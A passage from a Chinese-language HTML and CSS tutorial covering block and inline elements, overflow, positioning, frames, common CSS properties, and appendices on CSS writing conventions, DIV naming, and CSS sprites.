title="第十四章 块元素、行元素与溢出"></a>第十四章 块元素、行元素与溢出</h4><hr><ul><li><p>基本概念</p><ul><li>块级元素：默认情况下独占一行的元素，可控制宽高、上下边距；</li><li>行内元素：默认情况下一行可以摆放多个的元素，不可控制宽高和上下边距</li></ul></li><li><p>行块转换</p><ul><li><code>display:none</code>;  不显示</li><li><code>display:block</code>; 变成块级元素</li><li><code>display:inline</code>; 变成行级元素</li><li><code>display:inline-block</code>; 以块级元素样式展示，以行级元素样式排列</li></ul></li><li><p>溢出</p><ul><li><code>overflow:hidden</code>;   溢出隐藏</li><li><code>overflow:scroll</code>;   内容会被修剪，浏览器会显示滚动条</li><li><code>overflow:auto</code>;   如果内容被修剪，则产生滚动条</li></ul></li><li><p>文本不换行：<code>white-space:nowrap</code>;</p></li><li><p>长单词换行：<code>word-wrap:break-word</code>;</p></li></ul><ul><li><p>行内元素和快级元素小结</p><ul><li><p>一、<strong>块级元素</strong>：block element</p><ul><li><p>每个块级元素默认占一行高度，一行内添加一个块级元素后无法一般无法添加其他元素（<code>float</code>浮动后除外）。两个块级元素连续编辑时，会在页面自动换行显示。块级元素一般可嵌套块级元素或行内元素；</p></li><li><p>块级元素一般作为容器出现，用来组织结构，但并不全是如此。有些块级元素，如只能包含块级元素。</p></li><li><p><code>DIV</code> 是最常用的块级元素，元素样式的<code>display:block</code>都是块级元素。它们总是以一个块的形式表现出来，并且跟同级的兄弟块依次竖直排列，左右撑满。</p></li></ul></li><li><p>二、<strong>行内元素</strong>：inline element</p><ul><li>也叫内联元素、内嵌元素等；行内元素一般都是基于语义级(semantic)的基本元素，只能容纳文本或其他内联元素，常见内联元素 “a”。比如 <code>SPAN </code>元素，<code>IFRAME</code>元素和元素样式的<code>display : inline</code>的都是行内元素。例如文字这类元素，各个字母 之间横向排列，到最右端自动折行。</li></ul></li><li><p>三、<strong>block（块）元素的特点:</strong></p><ul><li>①、总是在新行上开始；</li><li>②、高度，行高以及外边距和内边距都可控制；</li><li>③、宽度缺省是它的容器的100%，除非设定一个宽度。</li><li>④、它可以容纳内联元素和其他块元素</li></ul></li><li><p>四、<strong>inline元素的特点</strong></p><ul><li>①、和其他元素都在一行上；</li><li>②、高，行高及外边距和内边距不可改变；</li><li>③、宽度就是它的文字或图片的宽度，不可改变</li><li>④、内联元素只能容纳文本或者其他内联元素</li></ul></li><li><p><strong>对行内元素，需要注意如下</strong>:</p><ul><li>设置宽度<code>width</code> 无效。 设置高度<code>height </code>无效，可以通过<code>line-height</code>来设置。 设置<code>margin</code></li><li>只有左右<code>margin</code>有效，上下无效。</li><li>设置<code>padding</code>只有左右<code>padding</code>有效，上下则无效。注意元素范围是增大了，但是对元素周围的内容是没影响的。</li></ul></li><li><p>五、<strong>常见的块状元素</strong></p><ul><li><code>address</code> – 地址</li><li><code>blockquote</code> – 块引用</li><li><code>center</code> – 举中对齐块</li><li><code>dir</code> – 目录列表</li><li><code>div</code> – 常用块级容易，也是<code>CSS layout</code>的主要标签</li><li><code>dl</code> – 定义列表</li><li><code>fieldset</code> – <code>form</code>控制组</li><li><code>form</code> – 交互表单</li><li><code>h1</code> – 大标题</li><li><code>h2</code> – 副标题</li><li><code>h3</code> – 3级标题</li><li><code>h4</code> – 4级标题</li><li><code>h5</code> – 5级标题</li><li><code>h6</code> – 6级标题</li><li><code>hr</code> – 水平分隔线</li><li><code>isindex</code> – <code>input prompt</code></li><li><code>menu</code> – 菜单列表</li><li><code>noframes</code> – <code>frames</code>可选内容，（对于不支持frame的浏览器显示此区块内容</li><li><code>noscript</code> – 可选脚本内容（对于不支持<code>script</code>的浏览器显示此内容）</li><li><code>ol</code> – 有序表单</li><li><code>p</code> – 段落</li><li><code>pre</code> – 格式化文本</li><li><code>table</code> – 表格</li><li><code>ul</code> – 无序列表</li></ul></li><li><p>六、<strong>常见的内联元素</strong></p><ul><li><code>a</code> – 锚点</li><li><code>abbr</code> – 缩写</li><li><code>acronym</code> – 首字</li><li><code>b</code> – 粗体(不推荐)</li><li><code>bdo</code> – <code>bidi override</code></li><li><code>big</code> – 大字体</li><li><code>br</code> – 换行</li><li><code>cite</code> – 引用</li><li><code>code</code> – 计算机代码(在引用源码的时候需要)</li><li><code>dfn</code> – 定义字段</li><li><code>em</code> – 强调</li><li><code>font</code> – 字体设定(不推荐)</li><li><code>i</code> – 斜体</li><li><code>img</code> – 图片</li><li><code>input</code> – 输入框</li><li><code>kbd</code> – 定义键盘文本</li><li><code>label</code> – 表格标签</li><li><code>q</code> – 短引用</li><li><code>s</code> – 中划线(不推荐)</li><li><code>samp</code> – 定义范例计算机代码</li><li><code>select</code> – 项目选择</li><li><code>small</code> – 小字体文本</li><li><code>span</code> – 常用内联容器，定义文本内区块</li><li><code>strike</code> – 中划线</li><li><code>strong</code> – 粗体强调</li><li><code>sub</code> – 下标</li><li><code>sup</code> – 上标</li><li><code>textarea</code> – 多行文本输入框</li><li><code>tt</code> – 电传文本</li><li><code>u</code> – 下划线</li></ul></li><li><p>七，<strong>可变元素</strong></p><ul><li>可变元素为根据上下文语境决定该元素为块元素或者内联元素。</li><li><code>applet</code> - <code>java applet</code></li><li><code>button</code> - 按钮</li><li><code>del </code>- 删除文本</li><li><code>iframe</code> - <code>inline frame</code></li><li><code>ins</code> - 插入的文本</li><li><code>map</code> - 图片区块(<code>map</code>)</li><li><code>object</code> - <code>object</code>对象</li><li><code>script</code> - 客户端脚本</li></ul></li><li><p>八、<strong>行内元素与块级元素有什么不同</strong></p><ul><li><p>区别一：</p><ul><li>块级：块级元素会独占一行，默认情况下宽度自动填满其父元素宽度</li><li>行内：行内元素不会独占一行，相邻的行内元素会排在同一行。其宽度随内容的变化而变化。</li></ul></li><li><p>区别二：</p><ul><li>块级：块级元素可以设置宽高</li><li>行内：行内元素不可以设置宽高</li></ul></li><li><p>区别三：</p><ul><li>块级：块级元素可以设置<code>margin</code>，<code>padding</code></li><li>行内：行内元素水平方向的<code>margin-left;</code> <code>margin-right;</code></li></ul></li><li><p><code>padding-left;</code> <code>padding-right</code>;可以生效。但是竖直方向的<code>margin-bottom</code>; <code>margin-top</code>; <code>padding-top</code>; <code>padding-bottom</code>;却不能生效。</p></li><li><p>区别四：</p><ul><li>块级：<code>display:block</code>;</li><li>行内：<code>display:inline</code>;</li></ul></li></ul></li><li><p>替换元素有如下：（和<code>img</code>一样的设置方法）</p><ul><li><code>&lt;img&gt;</code>、<code>&lt;input&gt;</code>、<code>&lt;textarea&gt;</code>、<code>&lt;select&gt;</code></li><li><code>&lt;object&gt;</code>都是替换元素，这些元素都没有实际的内容</li></ul></li></ul></li><li><p>可以通过修改<code>display</code>属性来切换块级元素和行内元素</p></li></ul><hr><h4 id="第十五章-定位"><a href="#第十五章-定位" class="headerlink" title="第十五章 定位"></a>第十五章 定位</h4><hr><ul><li><p><code>static</code>静态定位（不对它的位置进行改变，在哪里就在那里）</p><ul><li> 默认值。没有定位，元素出现在正常的流中（忽略 <code>top</code>,<code> bottom,</code>  <code>left, right</code> 或者 <code>z-index</code> 声明）。</li></ul></li><li><p><code>fixed</code>固定定位（参照物–浏览器窗口）—做 弹窗广告用到</p><ul><li>生成固定定位的元素，相对于浏览器窗口进行定位。 元素的位置通过 <code>&quot;left&quot;</code>, <code>&quot;top&quot;</code>, <code>&quot;right&quot; </code>以及 <code>&quot;bottom&quot; </code>属性进行规定。 </li></ul></li><li><p><code>relative</code>（相对定位 ）（参照物以他本身）</p><ul><li>生成相对定位的元素，相对于其正常位置进行定位。</li></ul></li><li><p><code>absolute</code>（绝对定位）(除了<code>static</code>都可以，找到参照物–&gt;与它最近的已经有定位的父元素进行定位)</p><ul><li>生成绝对定位的元素，相对于 <code>static</code> 定位以外的第一个父元素进行定位。</li><li>元素的位置通过 “<code>left&quot;</code>, <code>&quot;top&quot;</code>, <code>&quot;right&quot;</code> 以及 <code>&quot;bottom&quot;</code> 属性进行规定</li></ul></li><li><p>z-index</p><ul><li><code>z-index</code> 属性设置元素的堆叠顺序。拥有更高堆叠顺序的元素总是会处于堆叠顺序较低的元素的前面。</li><li>定位的基本思想: 它允许你定义元素框相对于其正常位置应该出现的位置，或者相对于父元素、另一个元素甚至浏览器窗口本身的位置。</li></ul></li><li><p>一切皆为框</p><ul><li>块级元素: <code>div</code>、<code>h1</code>或<code>p</code>元素 即：显示为一块内容称之为 “块框“ ;</li><li>行内元素: <code>span</code>,<code>strong</code>,<code>a</code>等元素 即：内容显示在行中称 “行内框”;</li><li>使用display属性改变成框的类型 即：<code>display:block</code>; 让行内元素设置为块级元素，<code>display:none;</code> 没有框</li></ul></li><li><p>相对定位：</p><ul><li>如果对一个元素进行相对定位，它将出现在它所在的位置上。 </li><li>通过设置垂直或水平位置，让这个元素“相对于”它的起点进行移动</li><li><code>.adv_relative &#123;  position: relative;  left: 30px;  top: 20px; &#125;</code></li></ul></li><li><p>绝对定位：</p><ul><li>元素的位置相对于最近的已定位祖先元素，如果元素没有已定位 的祖先元素，它的位置相对于最初的包含块。 <code>.adv_absolute &#123;  position: absolute;  left: 30px;  top: 20px; &#125;</code></li></ul></li></ul><hr><p><img src="./H4C2/danci.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"><br><img src="./H4C2/position.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><hr><h4 id="第十六章-框架"><a href="#第十六章-框架" class="headerlink" title="第十六章 框架"></a>第十六章 框架</h4><hr><ul><li><p><code>frameset</code>框架：</p><ul><li><code>&lt;frameset&gt; </code> —-  用来定义一个框架；双标签<br>不能和  <code>&lt;body&gt;</code>  一起使用</li></ul></li><li><p><code>rows</code>、<code>cols</code>属性</p><ul><li><code>rows </code> 定义行表示框架有多少行（取值 <code>px </code>/<code>%</code>/ <code>*</code> ）</li><li><code>cols</code>   定义列表示框架有多少列（取值<code>px</code>/ <code>% </code>/ <code>*</code> ）</li></ul></li><li><p>frame子框架</p><ul><li><p>&lt;<code>frame</code>&gt;  —-  表示框架中的某一个部分；单标签，要跟结束标志</p><ul><li><code>src</code> 显示的网页的路径</li><li><code>name</code> 框架名</li><li><code>frameborder</code>  边框线（取值 0 / 1）</li></ul></li><li><p>&lt;<code>noframes</code>&gt;属性</p></li><li><p>&lt;<code>noframes</code>&gt; 提供不支持框架的浏览器显示<code>body</code>的内容；双标签</p></li></ul></li></ul><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">frameset</span>&gt;</span>     <span class="hljs-tag">&lt;<span class="hljs-name">frame</span>  <span class="hljs-attr">src</span>=<span class="hljs-string">“”</span>  /&gt;</span>     <span class="hljs-tag">&lt;<span class="hljs-name">frame</span>  <span class="hljs-attr">src</span>=<span class="hljs-string">“”</span> /&gt;</span>     <span class="hljs-tag">&lt;<span class="hljs-name">frame</span>  <span class="hljs-attr">src</span>=<span class="hljs-string">“”</span> /&gt;</span>     <span class="hljs-tag">&lt;<span class="hljs-name">noframes</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>内容<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>     <span class="hljs-tag">&lt;/<span class="hljs-name">noframes</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">frameset</span>&gt;</span></code></pre></div><ul><li><code>&lt;iframe&gt;</code>内联框架<ul><li><code>iframe </code>元素会创建包含另外一个文档的内联框架（即行内框架）</li><li>允许和 <code>body</code> 一起使用</li><li><code>width</code> 宽（取值 px / %）</li><li><code>height</code> 高（取值 px / %）</li><li><code>name</code> 框架名</li><li><code>frameborder </code> 边框线（取值 0 / 1）</li><li><code>src</code> 显示的网页的路径</li></ul></li></ul><hr><h4 id="第十七章-css高级属性"><a href="#第十七章-css高级属性" class="headerlink" title="第十七章 css高级属性"></a>第十七章 css高级属性</h4><hr><ul><li><code>opacity</code>透明属性<ul><li><code>opacity</code><ul><li>对于<code>IE6/7/</code>，使用<code>filter:alpha(opacity:值;</code>)  值为<code>0-100</code></li><li>对于<code>Webkit</code>，<code>Opera</code>，<code>Firefox</code>，<code>IE9+</code>，使用<code>opacity</code>:值; 值为<code>0-1</code></li><li>对于早期火狐，使用<code>-moz-opacity</code>:值; 值为<code>0-1</code></li><li>所以写透明属性时，一般写法是</li></ul></li></ul></li></ul><div class="hljs code-wrapper"><pre><code class="hljs scss"> &#123;    <span class="hljs-attribute">opacity</span>:<span class="hljs-number">0.5</span>;   <span class="hljs-attribute">filter</span>:alpha(opacity：<span class="hljs-number">50</span>);<span class="hljs-comment">/*0-100*/</span>   -moz-<span class="hljs-attribute">opacity</span>:<span class="hljs-number">0.5</span>;<span class="hljs-comment">/*取值0-1*/</span>--&gt;针对早起版本的火狐兼容问题的解决&#125;</code></pre></div><ul><li><p><code>border-radius</code>圆角边框属性</p><ul><li>向 <code>div</code> 元素添加圆角边框<ul><li><code>border-radius:10px</code>;</li></ul></li></ul></li><li><p><code>box-shadow</code>阴影属性</p><ul><li><p><code>box-shadow </code>属性向框添加阴影效果,后面跟4个参数。</p></li><li><p><code>box-shadow:0px   0px   10px   #000;</code></p></li></ul></li><li><p><code>&lt;embed&gt;</code>属性</p><ul><li><p>是<code>HTML5</code>中新增的标签,媒体嵌入插件标签，可以通过<code>&lt;embed&gt;</code>插入音频或视频</p></li><li><p><code>&lt;embed src=“media/music.mp3” /&gt;</code></p></li><li><p>格式<code>.mid </code> <code>.wav</code> <code>.mp3</code>等</p></li></ul></li></ul><hr><hr><p><img src="./H4C2/overflow.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><hr><ul><li><a href="https://yunpan.cn/cM9va2bHD4wwu">原文件下载地址</a>   访问密码 342a</li></ul><hr><p><img src="./H4C2/csstixi.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><hr><ul><li><code>css</code>常见简写</li></ul><p><img src="./H4C2/sucha.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="css简写速查"></p><hr><h3 id="第三部分-附录"><a href="#第三部分-附录" class="headerlink" title="第三部分 附录"></a>第三部分 附录</h3><hr><h4 id="附录一-CSS书写规范"><a href="#附录一-CSS书写规范" class="headerlink" title="附录一 CSS书写规范"></a>附录一 CSS书写规范</h4><blockquote><p>为了欺骗W3C的验证工具,可将代码分为两个文件，一个是针对所有浏览器,一个只针对IE。即将所有符合W3C的代码写到一个文件中,而一些IE中必须而又不能通过W3C验证的代码（如:cursor:hand;）放到另一个文件中，再用下面的方法导入</p></blockquote><div class="hljs code-wrapper"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- 放置所有浏览器样式--&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- 只放置IE必须，而不能通过w3c的--&gt;</span><span class="hljs-comment">&lt;!--[if IE]</span><span class="hljs-comment">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&quot;&gt;</span><span class="hljs-comment">&lt;![endif]--&gt;</span></code></pre></div><p>CSS样式新建或修改尽量遵循以下原则</p><p>根据新建样式的适用范围分为三级：全站级、产品级、页面级。 尽量通过继承和层叠重用已有样式。 不要轻易改动全站级CSS。改动后，要经过全面测试。</p><hr><ul><li><p>属性显示顺序（规范写法）</p><ul><li>显示属性</li><li>元素位置</li><li>元素属性</li><li>元素内容属性</li></ul></li><li><p>CSS书写顺序</p><div class="hljs code-wrapper"><pre><code class="hljs CSS">  <span class="hljs-selector-class">.header</span> &#123;<span class="hljs-comment">/* 显示属性 */</span>    display || visibility    <span class="hljs-selector-tag">list-style</span>    position top || right || bottom || left    <span class="hljs-selector-tag">z-index</span>    <span class="hljs-selector-tag">clear</span>    <span class="hljs-selector-tag">float</span><span class="hljs-comment">/* 自身属性 */</span>    width max-width || min-width    height max-height || min-height    overflow || clip    <span class="hljs-selector-tag">margin</span>    <span class="hljs-selector-tag">padding</span>    <span class="hljs-selector-tag">outline</span>    <span class="hljs-selector-tag">border</span>    <span class="hljs-selector-tag">background</span><span class="hljs-comment">/* 文本属性 */</span>    <span class="hljs-selector-tag">color</span>    <span class="hljs-selector-tag">font</span>    <span class="hljs-selector-tag">text-overflow</span>    <span class="hljs-selector-tag">text-align</span>    <span class="hljs-selector-tag">text-indent</span>    <span class="hljs-selector-tag">line-height</span>    <span class="hljs-selector-tag">white-space</span>    <span class="hljs-selector-tag">vertical-align</span>    <span class="hljs-selector-tag">cursor</span>    <span class="hljs-selector-tag">content</span>  &#125;;</code></pre></div></li><li><p>兼容多个浏览器时，将标准属性写在底部</p></li></ul><div class="hljs code-wrapper"><pre><code class="hljs maxima">-moz-<span class="hljs-built_in">border</span>-<span class="hljs-built_in">radius</span>: 15px; <span class="hljs-comment">/* Firefox */</span>-webkit-<span class="hljs-built_in">border</span>-<span class="hljs-built_in">radius</span>: 15px; <span class="hljs-comment">/* Safari和Chrome */</span><span class="hljs-built_in">border</span>-<span class="hljs-built_in">radius</span>: 15px; <span class="hljs-comment">/* Opera 10.5+, 以及使用了IE-CSS3的IE浏览器 */</span>/标准属性</code></pre></div><ul><li>使用选择器时，命名比较短的词汇或者缩写的不允许直接定义样式</li></ul><p><code>.hd,.bd,.td&#123;&#125;;//如这些命名</code></p><ul><li>可用上级节点进行限定</li></ul><p><code>.recommend-mod .hd</code></p><ul><li>多选择器规则之间换行，即当样式针对多个选择器时每个选择器占一行。</li></ul><div class="hljs code-wrapper"><pre><code class="hljs CSS"><span class="hljs-selector-tag">button</span><span class="hljs-selector-class">.btn</span>,<span class="hljs-selector-tag">input</span><span class="hljs-selector-class">.btn</span>,input[type=&quot;button&quot;] &#123;…&#125;;</code></pre></div><ul><li>优化CSS选择器</li></ul><p><code>#header a &#123; color: #444; &#125;;/*CSS选择器是从右边到左边进行匹配*/</code></p><p>浏览器将检查整个文档中的所有链接和每个链接的父元素，并遍历文档树去查找ID为header的祖先元素，如果找不到header将追溯到文档的根节点，解决方法如下</p><div class="hljs code-wrapper"><pre><code class="hljs CSS">避免使用通配规则和相邻兄弟选择符、子选择符,、后代选择符、属性选择符等选择器不要限定<span class="hljs-selector-tag">id</span>选择符，如<span class="hljs-selector-tag">div</span><span class="hljs-selector-id">#header</span>（提权的除外）不要限定类选择器，如<span class="hljs-selector-tag">ul</span><span class="hljs-selector-class">.recommend</span>（提权的除外）不要使用 <span class="hljs-selector-tag">ul</span> <span class="hljs-selector-tag">li</span> <span class="hljs-selector-tag">a</span> 这样长的选择符避免使用标签子选择符，如<span class="hljs-selector-id">#header</span> &gt; <span class="hljs-selector-tag">li</span> &gt; <span class="hljs-selector-tag">a</span></code></pre></div><p>使用z-index属性尽量z-index的值不要超过150（通用组的除外），页面中的元素内容的z-index不能超过10（提示框等模块除外但维持在150以下），不允许直接使用（999~9999）之间大值。 尽量避免使用CSS Hack</p><div class="hljs code-wrapper"><pre><code class="hljs CSS"><span class="hljs-selector-tag">property</span><span class="hljs-selector-pseudo">:value</span>; <span class="hljs-comment">/* 所有浏览器 */</span>+<span class="hljs-selector-tag">property</span><span class="hljs-selector-pseudo">:value</span>; <span class="hljs-comment">/* IE7 */</span>_<span class="hljs-selector-tag">property</span><span class="hljs-selector-pseudo">:value</span>; <span class="hljs-comment">/* IE6 */</span>*<span class="hljs-selector-tag">property</span><span class="hljs-selector-pseudo">:value</span>; <span class="hljs-comment">/* IE6/7 */</span><span class="hljs-selector-tag">property</span><span class="hljs-selector-pseudo">:value</span>\9; <span class="hljs-comment">/* IE6/7/8/9，即所有IE浏览器 */</span>\* html selector &#123; … &#125;; /* IE6 */\*:first-child+html selector &#123; … &#125;; /* IE7 */html&gt;body selector &#123; … &#125;; /* 非IE6 */<span class="hljs-keyword">@-moz-document</span> url-prefix() &#123; … &#125;; <span class="hljs-comment">/* firefox */</span><span class="hljs-keyword">@media</span> all <span class="hljs-keyword">and</span> (<span class="hljs-attribute">-webkit-min-device-pixel-ratio:</span><span class="hljs-number">0</span>) &#123; … &#125;; <span class="hljs-comment">/* saf3+/chrome1+ */</span><span class="hljs-keyword">@media</span> all <span class="hljs-keyword">and</span> (<span class="hljs-attribute">-webkit-min-device-pixel-ratio:</span><span class="hljs-number">10000</span>),<span class="hljs-keyword">not</span> all <span class="hljs-keyword">and</span> (<span class="hljs-attribute">-webkit-min-device-pixel-ratio:</span><span class="hljs-number">0</span>) &#123; … &#125;; <span class="hljs-comment">/* opera */</span><span class="hljs-keyword">@media</span> screen <span class="hljs-keyword">and</span> (<span class="hljs-attribute">max-device-width:</span> <span class="hljs-number">480px</span>) &#123; … &#125;; <span class="hljs-comment">/* iPhone/mobile webkit */</span></code></pre></div><p>避免使用低效的选择器</p><div class="hljs code-wrapper"><pre><code class="hljs css">body &gt; * &#123;…&#125;;ul &gt; li &gt; a &#123;…&#125;;#footer &gt; h3 &#123;…&#125;;ul#top_blue_nav &#123;…&#125;;#searbar span.submit a &#123; … &#125;; /* 反面示例 */</code></pre></div><p>六个不要三个避免一个使用</p><div class="hljs code-wrapper"><pre><code class="hljs css">不要在标签上直接写样式不要在<span class="hljs-selector-tag">CSS</span>中使用<span class="hljs-selector-tag">expression</span>不要在<span class="hljs-selector-tag">CSS</span>中使用<span class="hljs-keyword">@import</span>不要在CSS中使用!important不要在CSS中使用“*”选择符不要将CSS样式写为单行避免使用filter避免使用行内（inline）样式避免使用“*”设置&#123;<span class="hljs-selector-tag">margin</span>: 0; <span class="hljs-selector-tag">padding</span>: 0;&#125;使用<span class="hljs-selector-tag">after</span>或<span class="hljs-selector-tag">overflow</span>的方式清浮动</code></pre></div><p>减少使用影响性能的属性</p><div class="hljs code-wrapper"><pre><code class="hljs scss"><span class="hljs-attribute">position</span>:absolute;<span class="hljs-attribute">float</span><span class="hljs-selector-pseudo">:left</span>;<span class="hljs-comment">//如这些定位或浮动属性</span></code></pre></div><p>减少在CSS中使用滤镜表达式和图片repeat,尤其在body当中,渲染性能极差, 如果需要用repeat的话,图片的宽或高不能少于8px</p><hr><h4 id="附录二-DIV命名规范"><a href="#附录二-DIV命名规范" class="headerlink" title="附录二 DIV命名规范"></a>附录二 DIV命名规范</h4><hr><ul><li><p>企业<code>DIV</code>使用频率高的命名方法</p></li><li><p><strong>网页内容类</strong></p><ul><li><p>标题: <code>title</code></p><ul><li>摘要: <code>summary</code></li><li>箭头： <code>arrow</code></li><li>商标： <code>label</code></li><li>网站标志： <code>logo</code></li><li>转角/圆角：<code> corner</code></li><li>横幅广告： <code>banner</code></li><li>子菜单： <code>subMenu</code></li><li>搜索： <code>search</code></li><li>搜索框： <code>searchBox</code></li><li>登录： <code>login</code></li><li>登录条：<code>loginbar</code></li><li>工具条： <code>toolbar</code></li><li>下拉： <code>drop</code></li><li>标签页： <code>tab</code></li><li>当前的： <code>current</code></li><li>列表： <code>list</code></li><li>滚动： <code>scroll</code></li><li>服务： <code>service</code></li><li>提示信息： <code>msg</code></li><li>热点：<code>hot</code></li><li>新闻： <code>news</code></li><li>小技巧： <code>tips</code></li><li>下载： <code>download</code></li><li>栏目标题： <code>title</code></li><li>热点： <code>hot</code></li><li>加入：<code> joinus</code></li><li>注册： <code>regsiter</code></li><li>指南： <code>guide</code></li><li>友情链接： <code>friendlink</code></li><li>状态： <code>status</code></li><li>版权： <code>copyright</code></li><li>按钮： <code>btn</code></li><li>合作伙伴： <code>partner</code></li><li>投票： <code>vote</code></li><li>左右中：<code>left</code>  <code>right</code>  <code>center</code></li></ul><hr></li><li><p>注释的写法: <code>/* Footer */ </code> 内容区<code>/* End Footer */</code></p></li></ul></li><li><p><strong>id的命名:</strong></p><ul><li><p>页面结构</p><ul><li>容器: <code>container</code></li><li>页头：<code>header</code></li><li>内容：<code>content</code>/<code>container</code></li><li>页面主体：<code>main</code></li><li>页尾：<code>footer</code></li><li>导航：<code>nav</code></li><li>侧栏：<code>sidebar</code></li><li>栏目：<code>column</code></li><li>页面外围控制整体布局宽度：<code>wrapper</code></li><li>左右中：<code>left</code> <code>right</code> <code>center</code></li></ul></li></ul><hr><ul><li><p>导航</p><ul><li>导航：<code>nav</code></li><li>主导航：<code>mainbav</code></li><li>子导航：<code>subnav</code></li><li>顶导航：<code>topnav</code></li><li>边导航：<code>sidebar</code></li><li>左导航：<code>leftsidebar</code></li><li>右导航：<code>rightsidebar</code></li><li>菜单：<code>menu</code></li><li>子菜单：<code>submenu</code></li><li>标题: <code>title</code></li><li>摘要: <code>summary</code></li></ul></li></ul><hr><ul><li><p>功能</p><ul><li>标志：<code>logo</code></li><li>广告：<code>banner</code></li><li>登陆：<code>login</code></li><li>登录条：<code>loginbar</code></li><li>注册：<code>regsiter</code></li><li>搜索：<code>search</code></li><li>功能区：<code>shop</code></li><li>标题：<code>title</code></li><li>加入：<code>joinus</code></li><li>状态：<code>status</code></li><li>按钮：<code>btn</code></li><li>滚动：<code>scroll</code></li><li>标签页：<code>tab</code></li><li>文章列表：<code>list</code></li><li>提示信息：<code>msg</code></li><li>当前的:<code> current</code></li><li>小技巧：<code>tips</code></li><li>图标: <code>icon</code></li><li>注释：<code>note</code></li><li>指南：<code>guild</code></li><li>服务：<code>service</code></li><li>热点：<code>hot</code></li><li>新闻：<code>news</code></li><li>下载：<code>download</code></li><li>投票：<code>vote</code></li><li>合作伙伴：<code>partner</code></li><li>友情链接：<code>link</code></li><li>版权：<code>copyright</code></li></ul></li></ul><hr><ul><li><p><strong><code>class</code>的命名:</strong></p></li><li><p>颜色:使用颜色的名称或者16进制代码,如</p><ul><li><code>.red &#123; color: red; &#125;</code></li><li><code>.f60 &#123; color: #f60; &#125;</code></li><li><code>.ff8600 &#123; color: #ff8600; &#125;</code></li></ul></li><li><p>字体大小,直接使用”font+字体大小”作为名称,如</p><ul><li><code>.font12px &#123; font-size: 12px; &#125;</code></li><li><code>.font9px &#123;font-size: 9pt; &#125;</code></li></ul></li><li><p>对齐样式,使用对齐目标的英文名称,如</p><ul><li><code>.left &#123; float:left; &#125;</code></li><li><code>.bottom &#123; float:bottom; &#125;</code></li></ul></li><li><p>标题栏样式,使用”类别+功能”的方式命名,如</p><ul><li><code> .barnews &#123; &#125;</code></li><li><code>.barproduct &#123; &#125;</code></li></ul><hr></li><li><p><strong>注意事项::</strong></p><ul><li>一律小写;</li><li>尽量用英文;</li><li>不加中杠和下划线;</li><li>尽量不缩写，除非一看就明白的单词.</li></ul><hr></li></ul></li><li><p><strong>推荐的 <code>CSS</code> 书写顺序：</strong></p><ul><li><p>显示属性</p><ul><li><code>display</code></li><li><code>list-style</code></li><li><code>position</code></li><li><code>float</code></li><li><code>clear</code></li></ul></li><li><p>自身属性</p><ul><li><code> width</code></li><li><code>height</code></li><li><code>margin</code></li><li><code>padding</code></li><li><code>border</code></li><li><code>background</code></li></ul></li><li><p>文本属性</p><ul><li><code>color</code></li><li><code> font</code></li><li><code>text-decoration</code></li><li><code>text-align</code></li><li><code>vertical-align</code></li><li><code>white-space</code></li><li><code>other text</code></li><li><code>content </code>    </li></ul></li></ul></li></ul><hr><h4 id="附录三-CSS精灵"><a href="#附录三-CSS精灵" class="headerlink" title="附录三 CSS精灵"></a>附录三 CSS精灵</h4><hr><ul><li><p><strong>CSS精灵原理以及应用</strong></p><ul><li><code>CSS</code>雪碧的基本原理是把你的网站上用到的一些图片整合到一张单独的图片中，从而减少你的网站的HTTP请求数量。<ul><li>该图片使用<code>CSS</code>   <code>background和background-position</code>属性渲染，这也就意味着你的标签变得更加复杂了，图片是在<code>CSS</code>中定义，而非<code>&lt;img&gt;</code>标签。</li></ul></li></ul></li><li><p><strong>一个简单的例子</strong>：</p><ul><li>一张图片作出一个按钮的三个状态</li><li>一个链接用<code>CSS</code>做成按钮的样式，我们可以使用同一张图片，完成按钮的三个状态，<code>a:link</code>，<code>a:hover</code>，<code>a:active</code> <code>&lt;a class=&quot;button&quot; href=&quot;#&quot;&gt;链接&lt;/a&gt;</code></li><li>加入右侧的图片为：<code>200px 65px</code>的三个按钮图拼合而成的图片<code>button.png</code>，从上到下一次为按钮的普通、鼠标滑过、鼠标点击的状态。则可以使用<code>CSS</code>进行定义。<div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span> &#123;    <span class="hljs-attribute">display</span>:block;     <span class="hljs-attribute">width</span>:<span class="hljs-number">200px</span>;     <span class="hljs-attribute">height</span>:<span class="hljs-number">65px</span>;     <span class="hljs-attribute">line-height</span>:<span class="hljs-number">65px</span>; <span class="hljs-comment">/*定义状态*/</span>    <span class="hljs-attribute">text-indent</span>:-<span class="hljs-number">2015px</span>; <span class="hljs-comment">/*隐藏文字*/</span>    <span class="hljs-attribute">background-image</span>:<span class="hljs-built_in">url</span>(button.png); <span class="hljs-comment">/*定义背景图片*/</span>    <span class="hljs-attribute">background-position</span>:<span class="hljs-number">0</span> <span class="hljs-number">0</span>;    <span class="hljs-comment">/*定义链接的普通状态，此时图像显示的是顶上的部分*/</span>&#125;<span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;    <span class="hljs-attribute">background-position</span>:<span class="hljs-number">0</span> -<span class="hljs-number">66px</span>;    <span class="hljs-comment">/*定义链接的滑过状态，此时显示的为中间部分，向下取负值*/</span>&#125;<span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:active</span> &#123;    <span class="hljs-attribute">background-position</span>:<span class="hljs-number">0</span> -<span class="hljs-number">132px</span>;                          <span class="hljs-comment">/*定 